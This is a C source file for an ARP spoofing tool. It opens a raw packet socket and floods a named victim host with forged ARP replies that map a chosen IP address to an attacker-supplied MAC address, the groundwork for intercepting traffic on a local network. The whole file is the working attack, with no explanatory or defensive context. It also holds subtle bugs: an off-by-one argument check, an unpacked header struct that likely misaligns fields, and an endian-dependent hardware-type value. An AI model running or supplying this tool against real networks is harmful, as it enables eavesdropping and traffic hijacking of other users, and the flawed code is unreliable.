#include <stdlib.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <string.h>
#include <assert.h>
#include <netinet/ether.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
 
struct my_arphdr {
    __be16 ar_hrd;
    __be16 ar_pro;
    unsigned char ar_hln;
    unsigned char ar_pln;
    __be16 ar_op;
 
    unsigned char ar_sha[ETH_ALEN];
    struct in_addr ar_sip;
    unsigned char ar_tha[ETH_ALEN];
    struct in_addr ar_tip;
};
 
int main(int argc, char *argv[]) {
    assert(argc >= 5);
 
    const char *interface = argv[1];
    const char *victim_mac = argv[2];
    const char *victim_ip = argv[3];
    const char *spoofed_mac = argv[4];
    const char *spoofed_ip = argv[5];
 
    void *buff = malloc(sizeof(struct ethhdr) + sizeof(struct my_arphdr));
    assert(buff);
   
    int raw = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    assert(raw != -1);
 
    struct ifreq ifr = { 0 };
    strncpy(ifr.ifr_name, interface, IFNAMSIZ);
 
    int ret = ioctl(raw, SIOCGIFINDEX, &ifr);
    assert(ret != -1);
 
    struct sockaddr_ll sll = { 0 };
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = ifr.ifr_ifindex;
    sll.sll_protocol = htons(ETH_P_ALL);
 
    ret = bind(raw, (struct sockaddr*)&sll, sizeof(sll));
    assert(ret != -1);
 
    while (1) {
        struct ethhdr *eth_header = (struct ethhdr *)buff;
        struct my_arphdr *arp_header = (struct my_arphdr *)(buff + sizeof(*eth_header));
 
        memcpy(eth_header->h_dest, (void *)ether_aton(victim_mac), 6);
        memcpy(eth_header->h_source, (void *)ether_aton(spoofed_mac), 6);
        eth_header->h_proto = htons(ETH_P_ARP);
 
        arp_header->ar_hrd = 256;
        arp_header->ar_pro = htons(ETH_P_IP);
        arp_header->ar_hln = 6;
        arp_header->ar_pln = 4;
        arp_header->ar_op = htons(ARPOP_REPLY);
 
        memcpy(arp_header->ar_sha, (void *)ether_aton(spoofed_mac), 6);
        memcpy(arp_header->ar_tha, (void *)ether_aton(victim_mac), 6);
        inet_aton(victim_ip, &arp_header->ar_tip);
        inet_aton(spoofed_ip, &arp_header->ar_sip);
       
        int bytes = write(raw, buff, sizeof(struct ethhdr) + sizeof(struct my_arphdr));
        assert(bytes == sizeof(struct ethhdr) + sizeof(struct my_arphdr));
    }
 
    free(buff);
    close(raw);
 
    return 0;
}